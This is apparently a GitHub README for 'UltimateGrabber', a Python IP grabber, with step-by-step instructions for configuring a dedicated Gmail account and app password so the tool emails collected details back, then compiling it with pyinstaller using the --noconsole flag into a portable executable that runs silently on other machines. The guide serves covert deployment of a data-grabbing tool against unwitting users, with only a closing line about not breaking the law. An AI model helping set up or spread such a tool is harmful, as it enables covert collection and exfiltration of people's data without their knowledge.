# UltimateGrabber V1.0.1
IP grabber programmed in python, designed to email details to a Gmail account. To set it up for your own account and get it working, you will need to take a few steps.

## #1 - Setup Gmail Account
You may want to make a new Gmail account to handle the outgoing messages, and ensure your password is not leaked from the file. Simply go to gmail.com and make a fresh account. There are a few things you will need to change here.

First of all, enable two-factor-authentication. Go to [myaccount.google.com](https://myaccount.google.com) and navigate to the security tab on the left. Then, scroll down until you find the 'Signing Into Google' section. Select 2-Step verification, enter your password, and follow the prompts to verify your phone number.

Now you will need to add what is known as an app password - these are random strings of letters that allow an external application to log into your Email account to start sending messages. If you just used your normal password in the code, google would reject the login request because it is a third-party application. If you use an application key in its place, however, google will allow the script to log in.

Below where you found the option to turn on 2-Step verification, you will find a new option titled 'App passwords'. Click it, and you will be asked for your password again. When the page loads select the drop-down which says 'Select app'. Set its value to other, and change it to whatever you like, something like 'Python' or 'Logger'. Click generate. A popup on the screen will appear with a yellow box containing a string of letters - this is your App password. Copy it with Control+C. You will not be able to view that specific password again, so keep it safe by inserting it into the script as soon as possible.

## #2 - Insert App Password Into Script
Download the python file contained within this repository.
Navigate to the bottom of the python script. 16 lines above the bottom (Line 44), you will find a series of variables that look like this:
`sender = "email@gmail.com"`
`recipient = "recipient@gmail.com"`
`app_password = "app password here"`.
Change the `sender` variable to hold the Gmail adress that you just set up.
Change the `recipient` value to the email adress you want to send the logs to. To make things less complicated, you can just change this to the sending Gmail adress, so it emails the logs to itself. Just declare this with `recipient = sender`. The lower section should now look like this:

![image](https://user-images.githubusercontent.com/83145315/186371119-151275d4-2cb0-4747-81b6-5f7182f63fce.png)

## #3 - Bundle Into EXE file 
This next step is technically optional, but necesary if you want the script to run on a computer without python or any of the script's modules installed.

To compile the code into an EXE file, we will be using the pyinstaller python module. If you don't have pyinstaller installed, you can do it easily by opening windows command prompt and typing `pip install pyinstaller`. Wait until it finishes installing.

Compiling the code is actually pretty easy. Open the folder that contains the python file you downloaded, and right click on the path bar above the file list. Click 'Copy adress as text'

![image](https://user-images.githubusercontent.com/83145315/186372995-bc75cb7a-f2aa-4775-abed-59f580fc38a4.png)

Open command prompt once more. Now, type `cd`, spacebar, then Control+V to paste the file path you just copied. Hit enter.

![image](https://user-images.githubusercontent.com/83145315/186373786-2e9c5a16-656f-470c-b463-9a1dac19cd40.png)

Now, type in `pyinstaller --onefile --noconsole UltimateGrabber.py` and hit enter. Pyinstaller will take about 20 seconds to compile the code. Afterwards, go check the folder which you had saved the python file again. You will see two new folders, titled `build` and `dist`. Inside `dist`, you will find an EXE file - success! you have successfully turned it into a portable executable.

If you run it, you will find a new email in you inbox - it will look something like this

![image](https://user-images.githubusercontent.com/83145315/186375254-7d55f361-4939-4180-9abd-b2f783c7bc9a.png)

You can now move the EXE file around wherever you want, and it will still work. *Just remember not to break the law!*



